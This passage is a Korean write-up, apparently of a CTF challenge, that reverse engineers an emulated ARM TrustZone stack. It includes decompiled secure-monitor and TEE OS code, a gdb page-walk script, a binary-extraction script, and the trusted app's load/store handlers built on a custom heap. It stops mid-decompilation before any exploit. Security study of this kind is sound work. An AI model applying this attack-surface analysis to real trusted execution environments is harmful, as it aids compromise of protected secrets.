4 \u0026amp; 1; if (uVar4 == 0) { new_SCR = new_SCR | 0x400; } if ((*(uint *)(param_2 + 4) \u0026gt;\u0026gt; 2 \u0026amp; 1) != 0) { new_SCR = new_SCR | 0x800; } new_SCR = new_SCR \u0026amp; 0xfffffff7; if (((uVar4 == 0) \u0026amp;\u0026amp; ((uVar1 \u0026gt;\u0026gt; 2 \u0026amp; 3) == 2)) || ((uVar4 != 0 \u0026amp;\u0026amp; ((uVar1 \u0026amp; 0xf) == 10)))) { new_SCR = new_SCR | 0x100; } if (uVar4 == 0) { uVar1 = 0x30d00800; } else { uVar1 = 0xc50838; } (secure_context-\u0026gt;sysregs).SCTLR_EL1 = (ulong)((*(uint *)(param_2 + 4) \u0026amp; 2) \u0026lt;\u0026lt; 0x18 | uVar1); lVar2 = actlr_el1; (secure_context-\u0026gt;sysregs).ACTLR_EL1 = lVar2; if (ns == 0) { (secure_context-\u0026gt;sysregs).PMCR_EL0 = 0x60; } /* SCR_EL3.NS = 0 */ secure_context-\u0026gt;scr_el3 = (ulong)new_SCR; secure_context-\u0026gt;pc = *(uint64_t *)(param_2 + 8); secure_context-\u0026gt;spsr = (ulong)*(uint *)(param_2 + 0x10); FUN_0000116c(secure_context,param_2 + 0x18,0x40); return; } 위와 같이 secure context를 세팅한다.\nvoid FUN_000001f8(long param_1) { restore_sysregs(0); set_spelx(0); FUN_00000c90(param_1 + 0x10); return; } FUN_00000c90 내부적으로 시스템 레지스터 세팅하고 eret한다. 대충 어떤식으로 world switch가 일어나고 어디를 분석해야할지 알게 되었다.\nSecure world pagewalk gdbscript qemu에서 system registers를 보여주는데 오류가 있어서 직접 pagewalk를 하는 스크립트를 따로 작성했다. 메뉴얼은 적당히 보고 넘기면서 구현했다. 위 AP[2:1] 모델을 보고 권한을 맞췄다.\nundefined4 FUN_080001e8(uint addr,uint phys_addr,uint param_3) { uint uVar1; int iVar2; uint lvl1_idx; uint local_30; uint uStack_2c; local_30 = 0x60f; if ((param_3 \u0026amp; 2) != 0) { local_30 = 0x64f; } if ((param_3 \u0026amp; 1) != 0) { local_30 = local_30 | 0x80; } uStack_2c = 0; if ((param_3 \u0026amp; 4) != 0) { uStack_2c = 0x400000; } if ((param_3 \u0026amp; 8) != 0) { uStack_2c = uStack_2c | 0x200000; } if ((param_3 \u0026amp; 0x10) != 0) { local_30 = local_30 | 0x20; } lvl1_idx = addr \u0026gt;\u0026gt; 21 \u0026amp; 0x7f; if ((*(uint *)(\u0026amp;trans_table_lvl1 + lvl1_idx * 8) | *(uint *)(lvl1_idx * 8 + 0x8004004)) == 0) { uVar1 = FUN_0800019c(\u0026amp;trans_table_lvl2 + lvl1_idx * 0x1000); *(uint *)(\u0026amp;trans_table_lvl1 + lvl1_idx * 8) = uVar1 | 3; FUN_08001944(\u0026amp;trans_table_lvl2 + lvl1_idx * 0x1000,0,0x1000); } iVar2 = ((addr \u0026gt;\u0026gt; 0xc \u0026amp; 0x1ff) + lvl1_idx * 0x200) * 8; *(uint *)(\u0026amp;trans_table_lvl2 + iVar2) = local_30 | phys_addr; *(uint *)(iVar2 + 0x8005004) = uStack_2c; return 0; } 읽었던 메뉴얼이랑 세부 사항이 다른 것같아서 리버싱한 결과대로 구현했다. 빠르게 구현하는데 초점을 맞춰서 구현이 제대로 되었는지는 잘 모르겠다. 기존에 미리 작성했던 secure world의 물리 메모리를 읽는 스크립트를 이용해서 구현했다.\nimport gdb TTBR0_EL1 = 0xe404000 gdb.execute(\u0026#39;source ./gdbscript.py\u0026#39;) res = gdb.execute(f\u0026#39;qemu_support read_phys {TTBR0_EL1} 512\u0026#39;,to_string=True) res = res.split(\u0026#39;\\n\u0026#39;)[:-1] next_table = [] next_table_idx = [] for idx, line in enumerate(res): l = (line.split()) v0, v1 = int(l[1],16), int(l[2],16) if v0 \u0026amp; 0b11: # exists next_table.append(v0) next_table_idx.append(idx*2) if v1 \u0026amp; 0b11: next_table.append(v1) next_table_idx.append(idx*2+1) for idx,i in enumerate(next_table): res = gdb.execute(f\u0026#39;qemu_support read_phys {(i\u0026gt;\u0026gt;10)\u0026lt;\u0026lt;10} 512\u0026#39;,to_string=True) res = res.split(\u0026#39;\\n\u0026#39;)[:-1] def f(v): E = \u0026#39;\u0026#39; if (v\u0026gt;\u0026gt;53)\u0026amp;1: E += \u0026#39;PXN \u0026#39; if (v\u0026gt;\u0026gt;54)\u0026amp;1: E += \u0026#39;XN \u0026#39; if (v\u0026gt;\u0026gt;5)\u0026amp;1: E += \u0026#39;NS \u0026#39; AP = (v \u0026gt;\u0026gt; 6)\u0026amp;3 if AP == 0b00: E += \u0026#39;PL1 Read/Write PL0 No-Access \u0026#39; elif AP == 0b01: E += \u0026#39;PL1 Read/Write PL0 Read/Write \u0026#39; elif AP == 0b10: E += \u0026#39;PL1 Read-Only PL0 No-Access \u0026#39; elif AP == 0b11: E += \u0026#39;PL1 Read-Only PL0 Read-Only \u0026#39; return E PT = \u0026#39;\u0026#39; if (i \u0026gt;\u0026gt; 2)\u0026amp;1: PT += \u0026#39;XN \u0026#39; if (i \u0026gt;\u0026gt; 3)\u0026amp;1: PT += \u0026#39;NS \u0026#39; for j, line in enumerate(res): l = (line.split()) v0, v1 = int(l[1],16), int(l[2],16) if v0 \u0026amp; 0b11: # exists bits = (next_table_idx[idx] \u0026lt;\u0026lt; 21) bits |= ((j*2) \u0026lt;\u0026lt; 12) print(hex(bits),hex(((v0\u0026gt;\u0026gt;12)\u0026lt;\u0026lt;12)\u0026amp;(2**36-1)),PT,f(v0)) if v1 \u0026amp; 0b11: bits = (next_table_idx[idx] \u0026lt;\u0026lt; 21) bits |= ((j*2+1) \u0026lt;\u0026lt; 12) print(hex(bits),hex(((v1\u0026gt;\u0026gt;12)\u0026lt;\u0026lt;12)\u0026amp;(2**36-1)),PT,f(v1)) Exception vector tables를 포함한 text 부분이 PL1에서도 Read-Only 인 것을 보니 구현이 틀리지는 않았을 것 같다.\nReverse engineering S-EL1 VBAR은 0xe400000 이다.\nvoid FUN_00001698(void) { uint uVar1; undefined4 in_cr0; undefined4 in_cr2; undefined4 in_cr8; undefined4 in_cr10; undefined4 in_cr12; coprocessor_moveto2(0xf,0,DAT_00001798 + (0x16a0 - DAT_000017a8),0,in_cr2); coprocessor_moveto2(0xf,1,0,0,in_cr2); coprocessor_moveto(0xf,0,0,0xff440400,in_cr10,in_cr2); coproc_moveto_Translation_table_control(0x80802504); coproc_moveto_Domain_Access_Control(DAT_000017ac); coprocessor_moveto(0xf,0,0,DAT_000017b0,in_cr12,in_cr0); uVar1 = coproc_movefrom_Control(); coproc_moveto_Control(uVar1 | 1); InstructionSynchronizationBarrier(0xf); setSupervisorMode(); coprocessor_moveto(0xf,0,0,DAT_000017b4,in_cr12,in_cr0); uVar1 = coproc_movefrom_Coprocessor_Access_Control(); coproc_moveto_Coprocessor_Access_Control(uVar1 \u0026amp; 0x7fffffff | 0xf00000); InstructionSynchronizationBarrier(0xf); uVar1 = coprocessor_movefromRt(10,7,0,in_cr8,in_cr0); coprocessor_moveto(10,7,0,uVar1 | 0x40000000,in_cr8,in_cr0); uVar1 = coproc_movefrom_Control(); coproc_moveto_Control(uVar1 | 0x1804); FUN_00000060(uVar1 | 0x1804); setSupervisorMode(); *(undefined4 *)(DAT_000017bc + 0x44) = DAT_000017c0; setAbortMode(); setUndefinedMode(); software_smc(0); do { /* WARNING: Do nothing block with infinite loop */ } while( true ); } 이런 괴랄한 코드는 어떻게 읽는지 모르겠다.\n************************************************************* * FUNCTION ************************************************************* undefined FUN_00001698 () undefined r0:1 \u0026lt;RETURN\u0026gt; FUN_00001698 XREF[1]: FUN_000014f4:00001524 (c) 00001698 0f a0 a0 e1 cpy r10 ,pc 0000169c 04 01 9f e5 ldr r0,[DAT_000017a8 ] = A0160008h 000016a0 00 a0 4a e0 sub r10 ,r10 ,r0 000016a4 ec 00 9f e5 ldr r0,[DAT_00001798 ] = 00400008h 000016a8 0a 00 80 e0 add r0,r0,r10 000016ac 00 a0 a0 e3 mov r10 ,#0x0 000016b0 02 0f 4a ec mcrr p15,0x0 ,r0,r10 ,cr2 000016b4 00 00 a0 e3 mov r0,#0x0 000016b8 12 0f 4a ec mcrr p15,0x1 ,r0,r10 ,cr2 000016bc ff 04 a0 e3 mov r0,#0xff000000 000016c0 11 07 80 e3 orr r0,r0,#0x440000 000016c4 01 0b 80 e3 orr r0,r0,#0x400 000016c8 12 0f 0a ee mcr p15,0x0 ,r0,cr10 ,cr2 ,0x0 000016cc 02 01 a0 e3 mov r0,#0x80000000 000016d0 04 00 80 e3 orr r0,r0,#0x4 000016d4 02 0a 80 e3 orr r0,r0,#0x2000 000016d8 02 05 80 e3 orr r0,r0,#0x800000 000016dc 01 0b 80 e3 orr r0,r0,#0x400 000016e0 01 0c 80 e3 orr r0,r0,#0x100 000016e4 50 0f 02 ee mcr p15,0x0 ,r0,cr2 ,cr0 ,0x2 000016e8 bc 00 9f e5 ldr r0,[DAT_000017ac ] = 55555555h 000016ec 10 0f 03 ee mcr p15,0x0 ,r0,cr3 ,cr0 ,0x0 000016f0 ff ff ff ea b LAB_000016f4 mcrr은 register 두 개를 쓰는거라 64-bit 시스템 레지스터에 쓴다고 한다. 이런식의 인코딩 차이가 있다. 드디어 CRm만 가지고 어떻게 표를 보는지 알게 되었다.\nbios.bin을 FEFFFFEA로 패치해서 무한루프를 만들어서 원하는 곳을 디버깅할 수 있다. Normal world에 대한 디버깅 능력을 상실했으니 무조건 secure world에서 멈춰야한다. 디버거가 시스템 레지스터를 제대로 표현하지 못한다.\nvoid FUN_0e401698(void) { uint uVar1; undefined4 in_cr0; undefined4 in_cr2; undefined4 in_cr8; undefined4 in_cr10; undefined4 in_cr12; /* TTBR0 */ coprocessor_moveto2(0xf,0,DAT_0e401798 + (0xe4016a0 - DAT_0e4017a8),0,in_cr2); /* TTBR1 */ coprocessor_moveto2(0xf,1,0,0,in_cr2); coprocessor_moveto(0xf,0,0,0xff440400,in_cr10,in_cr2); /* TTBCR */ coproc_moveto_Translation_table_control(0x80802504); /* DACR */ coproc_moveto_Domain_Access_Control(DAT_0e4017ac); /* VBAR */ coprocessor_moveto(0xf,0,0,LONG_0e4017b0,in_cr12,in_cr0); uVar1 = coproc_movefrom_Control(); /* enable mmu */ coproc_moveto_Control(uVar1 | 1); InstructionSynchronizationBarrier(0xf); setSupervisorMode(); coprocessor_moveto(0xf,0,0,DAT_0e4017b4,in_cr12,in_cr0); uVar1 = coproc_movefrom_Coprocessor_Access_Control(); coproc_moveto_Coprocessor_Access_Control(uVar1 \u0026amp; 0x7fffffff | 0xf00000); InstructionSynchronizationBarrier(0xf); uVar1 = coprocessor_movefromRt(10,7,0,in_cr8,in_cr0); coprocessor_moveto(10,7,0,uVar1 | 0x40000000,in_cr8,in_cr0); uVar1 = coproc_movefrom_Control(); coproc_moveto_Control(uVar1 | 0x1804); FUN_0e400060(uVar1 | 0x1804); setSupervisorMode(); *(undefined4 *)(DAT_0e4017bc + 0x44) = DAT_0e4017c0; setAbortMode(); setUndefinedMode(); software_smc(0); do { /* WARNING: Do nothing block with infinite loop */ } while( true ); } 천천히 보니 대충 어떤 행동을 하고 있는지 알 것 같다. MMU를 키고 그냥 00으로 밀려있다. 많이 따라갈 필요도 없이 손으로 해도 될 것같다. 구조도 별로 다른건 없어보인다. VBAR는 VA 0x8000040 이지만, PA로 변환해보면 0xe400040이다. MMU가 한번 활성화되면 이후엔 디버깅이 안되고 그냥 알아서 넘어가버리기 때문에 MMU bit 활성화 이후를 디버깅할 수 없다. 그래서 vector table entry에 무한 루프 걸어놓고 마저 디버깅을 시도했다. Prefetch Abort에 잡히는 걸 보니 예상대로 그냥 거기서 에러나서 뛰는 것 같다. Abort라서 그런지 mode도 Abort로 바뀐다. cps로 다시 supervisor mode로 변경해서 마저 TEE os initialization을 수행한다.\nvoid UndefinedFunction_0e40004c(void) { uint uVar1; undefined4 in_cr0; undefined4 in_cr8; undefined4 in_cr12; setSupervisorMode(); coprocessor_moveto(0xf,0,0,DAT_0e4017b4,in_cr12,in_cr0); uVar1 = coproc_movefrom_Coprocessor_Access_Control(); coproc_moveto_Coprocessor_Access_Control(uVar1 \u0026amp; 0x7fffffff | 0xf00000); InstructionSynchronizationBarrier(0xf); uVar1 = coprocessor_movefromRt(10,7,0,in_cr8,in_cr0); coprocessor_moveto(10,7,0,uVar1 | 0x40000000,in_cr8,in_cr0); uVar1 = coproc_movefrom_Control(); coproc_moveto_Control(uVar1 | 0x1804); FUN_0e400060(uVar1 | 0x1804); setSupervisorMode(); *(undefined4 *)(DAT_0e4017bc + 0x44) = DAT_0e4017c0; setAbortMode(); setUndefinedMode(); software_smc(0); /* WARNING: Bad instruction - Truncating control flow here */ halt_baddata(); } 다시 VBAR을 정상적으로 세팅해준다.\n0e401754 10 0f 01 ee mcr p15,0x0 ,r0,cr1 ,cr0 ,0x0 0e401758 58 d0 9f e5 ldr sp,[DAT_0e4017b8 ] = 08087000h 0e40175c 3f fa ff fa blx FUN_0e400060 undefined FUN_0e400060() 0e401760 13 00 02 f1 cps #19 0e401764 50 d0 9f e5 ldr sp,[DAT_0e4017bc ] = 08085000h 0e401768 50 00 9f e5 ldr r0,[DAT_0e4017c0 ] = 10000000h thumb로 모드를 변경한다.\n08001780 3c 10 9f e5 ldr r1,[DAT_080017c4 ] = 08000000h 08001784 02 00 00 e3 movw r0,#0x2 08001788 00 03 48 e3 movt r0,#0x8300 0800178c 70 00 60 e1 smc 0x0 그리고 다시 smc를 불러서 secure monitor로 돌아간다. 의사코드만 읽다가 위 어셈블리 스니펫을 놓쳤었는데, 이거 때문에 하루종일 삽질했다. 다시 secure monitor로 돌아가면 r1을 저장하며, TEE OS initialized 문구를 출력한다 EL0에서 TA_Bin을 secure world로 업로드했었는데, 거기를 처리하는 로직을 찾아야한다. secure monitor 분석 결과를 기반으로 처리 로직은 vector_table + 0x20 를 따라가면 나온다는 것을알고 있다.\nvoid FUN_0800087c(void) { undefined4 local_c; switch(DAT_08085000) { case 0x83000003: local_c = FUN_08000724(DAT_08085004,uRam08085008); break; case 0x83000004: local_c = FUN_08000790(DAT_08085004,uRam08085008); break; case 0x83000005: local_c = FUN_080007ea(DAT_08085004,uRam08085008); break; case 0x83000006: local_c = FUN_0800083e(DAT_08085004); break; default: local_c = 0xffffffff; } secure_monitor_call(0x83000007,local_c); return; } entry 부터 쭉 따라가다 보면 바로 원하는 로직을 발견할 수 있다. 여기서 업로드 로직을 확인해야 secure world에서 동작하는 user binary가 어떻게 동작하는지 알 수 있다.\nundefined4 FUN_08000c38(int param_1,undefined4 param_2) { int iVar1; int iVar2; int iVar3; int iVar4; int iVar5; iVar1 = FUN_08000bb0(param_1,param_2); if (iVar1 != 0) { iVar4 = *(int *)(param_1 + 0x10); iVar5 = ((*(int *)(param_1 + 0x10) - 1U \u0026gt;\u0026gt; 0xc) + 1) * 0x1000; iVar1 = FUN_0800042e(*(undefined4 *)(param_1 + 0xc),iVar5,10); if ((((iVar1 != -1) \u0026amp;\u0026amp; ((iVar1 = ((*(int *)(param_1 + 0x18) - 1U \u0026gt;\u0026gt; 0xc) + 1) * 0x1000, *(int *)(param_1 + 0x18) == 0 || (iVar2 = FUN_0800042e(*(undefined4 *)(param_1 + 0x14),iVar1,0xe), iVar2 != -1)))) \u0026amp;\u0026amp; ((iVar2 = ((*(int *)(param_1 + 0x20) - 1U \u0026gt;\u0026gt; 0xc) + 1) * 0x1000, *(int *)(param_1 + 0x20) == 0 || (iVar3 = FUN_0800042e(*(undefined4 *)(param_1 + 0x1c),iVar2,0xe), iVar3 != -1)))) \u0026amp;\u0026amp; (iVar3 = FUN_0800042e(0xff8000,0x8000,0xe), iVar3 != -1)) { FUN_08001944(*(undefined4 *)(param_1 + 0xc),0,iVar5); FUN_08001906(*(undefined4 *)(param_1 + 0xc),param_1 + 0x24,*(undefined4 *)(param_1 + 0x10)); if (*(int *)(param_1 + 0x18) != 0) { FUN_08001944(*(undefined4 *)(param_1 + 0x14),0,iVar1); FUN_08001906(*(undefined4 *)(param_1 + 0x14),param_1 + iVar4 + 0x24, *(undefined4 *)(param_1 + 0x18)); } if (*(int *)(param_1 + 0x20) != 0) { FUN_08001944(*(undefined4 *)(param_1 + 0x1c),0,iVar2); } FUN_08001944(0xff8000,0,0x8000); uRam08085048 = *(undefined4 *)(param_1 + 8); iRam0808504c = *(int *)(param_1 + 0x20) + *(int *)(param_1 + 0x1c) + -4; return 0; } } return 0xffffffff; } 위는 커스텀 로더의 구현이다.\nundefined4 FUN_08000bb0(undefined4 param_1,undefined4 param_2) { int iVar1; undefined auStack_a0 [112]; undefined auStack_30 [32]; undefined4 local_10; int local_c; local_10 = 0x800304c; FUN_080011a2(auStack_a0); FUN_08001228(auStack_a0,param_1,param_2); FUN_08001296(auStack_a0,auStack_30); local_c = 0; while( true ) { if (local_c != 0) { return 0; } iVar1 = FUN_080018b4(auStack_30,local_10,0x20); if (iVar1 == 0) break; local_c = local_c + 1; } return 1; } 검증 로직으로 보인다.\nint FUN_080018b4(byte *param_1,byte *param_2,int param_3) { byte bVar1; byte bVar2; int local_24; byte *local_10; byte *local_c; local_24 = param_3; local_10 = param_2; local_c = param_1; do { if (local_24 == 0) { return 0; } bVar1 = *local_c; bVar2 = *local_10; local_24 = local_24 + -1; local_10 = local_10 + 1; local_c = local_c + 1; } while (bVar1 == bVar2); return (uint)bVar1 - (uint)bVar2; } 0x20 만큼 비교를 수행하는 것으로 보인다.\nvoid FUN_080011a2(int param_1) { *(undefined4 *)(param_1 + 0x40) = 0; *(undefined4 *)(param_1 + 0x48) = 0; *(undefined4 *)(param_1 + 0x4c) = 0; *(undefined4 *)(param_1 + 0x50) = 0x6a09e667; *(undefined4 *)(param_1 + 0x54) = 0xbb67ae85; *(undefined4 *)(param_1 + 0x58) = 0x3c6ef372; *(undefined4 *)(param_1 + 0x5c) = 0xa54ff53a; *(undefined4 *)(param_1 + 0x60) = 0x510e527f; *(undefined4 *)(param_1 + 100) = 0x9b05688c; *(undefined4 *)(param_1 + 0x68) = 0x1f83d9ab; *(undefined4 *)(param_1 + 0x6c) = 0x5be0cd19; return; } sha256으로 검증한다.\nFUN_0800042e는 S-EL0를 위한 메모리를 매핑하는 것으로 보인다.\nundefined4 FUN_0800042e(int addr,int sz,undefined4 c10) { int iVar1; int local_18; int local_14; local_18 = sz; local_14 = addr; while( true ) { if (local_18 == 0) { return 0; } iVar1 = FUN_08000684(); if ((iVar1 == -1) || (iVar1 = FUN_080001e8(local_14,iVar1,c10), iVar1 == -1)) break; local_14 = local_14 + 0x1000; local_18 = local_18 + -0x1000; } return 0xffffffff; } 뭔가 normalized size를 넘기고 address로 추정되는 값을 넘기고 있다. FUN_080001e8 내부적으로 page table을 수정해서 VA, PA를 매핑하고 있다. AArch32긴 한데 하위 2비트가 11인 것으로 보아 AArch64 처럼 주소 변환이 동작하는 것으로 보인다. 세 번째 인자는 페이지에 대한 속성으로 보인다.\nReversing the binary loader \u0026amp; S-EL0 binary extraction import struct with open(\u0026#39;./bios.bin\u0026#39;, \u0026#39;rb\u0026#39;) as f: f.seek(0x00bdf10) buf = f.read(0x750) with open(\u0026#39;./SEL0.bin\u0026#39;,\u0026#39;wb\u0026#39;) as f: f.write(buf[0x24:]) # mapping start ext32 = lambda x : struct.unpack(\u0026#39;\u0026lt;I\u0026#39;,x)[0] size0 = ext32(buf[0x10:0x14]) addr0 = ext32(buf[0xc:0x10]) print(hex(addr0), hex(size0)) size1 = ext32(buf[0x18:0x1c]) addr1 = ext32(buf[0x14:0x18]) print(hex(addr1), hex(size1)) size2 = ext32(buf[0x20:0x24]) addr2 = ext32(buf[0x1c:0x20]) print(hex(addr2), hex(size2)) print(hex(0xff8000), hex(0x8000)) 0x1000 0x1000 (0x684) 0x2000 0x1000 (0xa8) 0x100000 0x82000 (0x81070) 0xff8000 0x8000 (0x8000) 위와 같이 매핑한다. 권한은 아래와 같다. 0x24만큼 헤더가 짤린 SEL0.bin을 기드라에 로드해서 세그먼트 별로 잘라서 로드해주고 분석하면 된다. 다음은 tci call시 호출되는 함수다.\nundefined4 FUN_08000dbe(TCI *r1) { undefined4 local_c; if (Entry != 0xffffffff) { if ((Entry \u0026amp; 1) == 0) { local_c = 0x1d0; } else { local_c = 0x1f0; } FUN_08001944(\u0026amp;ctx,0,0x3c); *tci_handle = r1; _DAT_08085040 = local_c; _DAT_0808503c = Entry; ctx.sp._0_1_ = 0xf0; ctx.sp._1_1_ = 0xff; ctx.sp._2_1_ = 0xff; ctx.sp._3_1_ = 0; FUN_0800187c(); } return 0xffffffff; } sp를 세팅한다.\n************************************************************* * FUNCTION ************************************************************* undefined FUN_08001818 (undefined param_1 , undefined par undefined r0:1 \u0026lt;RETURN\u0026gt; undefined r0:1 param_1 undefined r1:1 param_2 undefined r2:1 param_3 undefined r3:1 param_4 undefined Stack[0x0]:1 param_5 undefined Stack[0x4]:1 param_6 undefined Stack[0x8]:1 param_7 undefined Stack[0xc]:1 param_8 undefined Stack[0x10]:1 param_9 undefined Stack[0x14]:1 param_10 undefined4 Stack[0x34]:4 param_11 XREF[1]: 08001818 (R) undefined4 Stack[0x38]:4 param_12 XREF[1]: 0800181c (R) FUN_08001818 XREF[1]: FUN_080015b4:08001870 (c) 08001818 34 00 9d e5 ldr param_1 ,[sp,#param_11 ] 0800181c 38 10 9d e5 ldr param_2 ,[sp,#param_12 ] 08001820 1f 00 02 f1 cps #31 08001824 0d 20 a0 e1 cpy param_3 ,sp 08001828 00 d0 a0 e1 cpy sp,param_1 0800182c 01 e0 a0 e1 cpy lr,param_2 08001830 13 00 02 f1 cps #19 08001834 44 20 8d e5 str param_3 ,[sp,#0x44 ] 08001838 00 00 9d e5 ldr param_1 ,[sp,#0x0 ] 0800183c 04 10 9d e5 ldr param_2 ,[sp,#0x4 ] 08001840 08 20 9d e5 ldr param_3 ,[sp,#0x8 ] 08001844 0c 30 9d e5 ldr param_4 ,[sp,#0xc ] 08001848 10 40 9d e5 ldr r4,[sp,#0x10 ] 0800184c 14 50 9d e5 ldr r5,[sp,#0x14 ] 08001850 18 60 9d e5 ldr r6,[sp,#0x18 ] 08001854 1c 70 9d e5 ldr r7,[sp,#0x1c ] 08001858 20 80 9d e5 ldr r8,[sp,#0x20 ] 0800185c 24 90 9d e5 ldr r9,[sp,#0x24 ] 08001860 28 a0 9d e5 ldr r10 ,[sp,#0x28 ] 08001864 2c b0 9d e5 ldr r11 ,[sp,#0x2c ] 08001868 30 c0 9d e5 ldr r12 ,[sp,#0x30 ] 0800186c 1e ff 2f e1 bx lr LAB_08001870 XREF[1]: FUN_0800187c:08001888 (j) 08001870 e8 ff ff eb bl FUN_08001818 undefined FUN_08001818(undefined 08001874 3c e0 9d e5 ldr lr,[sp,#0x3c ] 08001878 0e f0 b0 e1 movs pc,lr hdr[0x8:12]는 0x126b로 S-EL0의 entrypoint라고 볼 수 있다. S-EL0의 context를 복구하고 여기로 pc에 entrypoint를 넣는다. tci handle도 특정 부분에 기록되어서 S-EL0로 넘어간다.\nS-EL0, Secure application void FUN_0000126a(void) { code *UNRECOVERED_JUMPTABLE; FUN_0000122c(tci_handle); /* WARNING: Could not recover jumptable at 0x00001288. Too many branches */ /* WARNING: Treating indirect jump as call */ (*UNRECOVERED_JUMPTABLE)(); return; } 엔트리 포인트부터 확인해보면 S-EL1에서 기록한 tci_handle을 넘겨받는 것을 확인할 수 있다.\nvoid FUN_0000122c(TCI *tci_handle_arg) { code *UNRECOVERED_JUMPTABLE; interrupt_kernel(0xb,0x1001); if (tci_handle_arg-\u0026gt;cmd == 2) { /* load */ FUN_0000104e(tci_handle_arg); } else if (tci_handle_arg-\u0026gt;cmd == 3) { /* store */ FUN_000010f6(tci_handle_arg); } UNRECOVERED_JUMPTABLE = FUN_0000126a + 1; FUN_0000166c(0); FUN_0000122c(tci_handle); /* WARNING: Could not recover jumptable at 0x00001288. Too many branches */ /* WARNING: Treating indirect jump as call */ (*UNRECOVERED_JUMPTABLE)(); return; } 내부적으로 store 함수에서 custom heap allocator를 이용한다. software_interrupt1은 S-EL1에서 svc 뒤에 나오는 숫자를 추출해서, S-EL1의 software interrupt handler에서 호출하는 함수 포인터에 대한 대입 연산을 수행해서 user level에서의 exception handler 할당이 가능하다.\nvoid FUN_000010f6(TCI *param_1) { undefined4 local_64; undefined4 uStack_60; undefined4 uStack_5c; undefined4 uStack_58; undefined4 local_54; undefined4 uStack_50; undefined4 uStack_4c; undefined4 uStack_48; undefined4 local_44; undefined4 uStack_40; undefined4 uStack_3c; undefined4 uStack_38; undefined2 local_34; undefined4 local_30; undefined4 uStack_2c; undefined4 uStack_28; undefined4 uStack_24; undefined4 local_20; undefined2 uStack_1c; char cStack_1a; uint local_18; uint idx; idx = param_1-\u0026gt;index; if (idx \u0026lt; 10) { if (UINT_ARRAY_00100000[idx * 2 + 1] != 0) { free((char *)UINT_ARRAY_00100000[idx * 2 + 1]); UINT_ARRAY_00100000[idx * 2 + 1] = 0; *(undefined4 *)(idx * 8 + 0x100000) = 0; } local_18 = malloc(param_1-\u0026gt;size); if (local_18 == 0) { local_64._0_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[0]; local_64._1_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[1]; local_64._2_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[2]; local_64._3_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[3]; uStack_60._0_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[4]; uStack_60._1_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[5]; uStack_60._2_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[6]; uStack_60._3_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[7]; uStack_5c._0_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[8]; uStack_5c._1_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[9]; uStack_5c._2_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[10]; uStack_5c._3_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[11]; uStack_58._0_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[12]; uStack_58._1_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[13]; uStack_58._2_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[14]; uStack_58._3_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[15]; local_54._0_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[16]; local_54._1_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[17]; local_54._2_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[18]; local_54._3_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[19]; uStack_50._0_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[20]; uStack_50._1_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[21]; uStack_50._2_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[22]; uStack_50._3_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[23]; uStack_4c._0_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[24]; uStack_4c._1_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[25]; uStack_4c._2_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[26]; uStack_4c._3_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[27]; uStack_48._0_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[28]; uStack_48._1_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[29]; uStack_48._2_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[30]; uStack_48._3_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[31]; local_44._0_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[32]; local_44._1_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[33]; local_44._2_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[34]; local_44._3_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[35]; uStack_40._0_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[36]; uStack_40._1_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[37]; uStack_40._2_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[38]; uStack_40._3_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[39]; uStack_3c._0_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[40]; uStack_3c._1_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[41]; uStack_3c._2_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[42]; uStack_3c._3_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[43]; uStack_38._0_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[44]; uStack_38._1_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[45]; uStack_38._2_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[46]; uStack_38._3_1_ = s_assert((ptr_=_(uint8_t_*)malloc(_00002070[47]; local_34 = (undefined2)s_assert((ptr_=_(uint8_t_*)malloc(_00002070._48_4_; strcpy(param_1-\u0026gt;data,\u0026amp;local_64); param_1-\u0026gt;cmd = 1; } else { UINT_ARRAY_00100000[idx * 2 + 1] = local_18; *(uint *)(idx * 8 + 0x100000) = param_1-\u0026gt;size; memcpy((char *)UINT_ARRAY_00100000[idx * 2 + 1],(int 